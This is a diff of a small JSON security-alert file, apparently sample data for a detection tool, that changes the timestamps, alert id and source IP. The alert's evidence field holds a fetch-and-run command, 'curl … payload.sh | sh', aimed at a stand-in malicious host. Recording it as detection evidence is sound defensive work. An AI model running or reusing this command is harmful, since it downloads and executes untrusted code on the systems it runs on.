@@ -1,16 +1,16 @@
 {
-  "generated_at": "2025-10-16T20:21:44.826836+00:00",
+  "generated_at": "2025-10-16T21:17:00.143033+00:00",
   "count": 1,
   "alerts": [
     {
-      "id": "alert-61473",
-      "timestamp": "2025-10-16T20:21:44.826818+00:00",
-      "summary": "MEDIUM confidence: Suspicious command observed from 185.243.25.12",
+      "id": "alert-37519",
+      "timestamp": "2025-10-16T21:17:00.143016+00:00",
+      "summary": "MEDIUM confidence: Suspicious command observed from 192.0.2.1",
       "confidence": "medium",
       "evidence": {
         "process": "cmd.exe",
         "command": "curl http://malicious.example/payload.sh | sh",
-        "source_ip": "185.243.25.12"
+        "source_ip": "192.0.2.1"
       }
     }
   ]
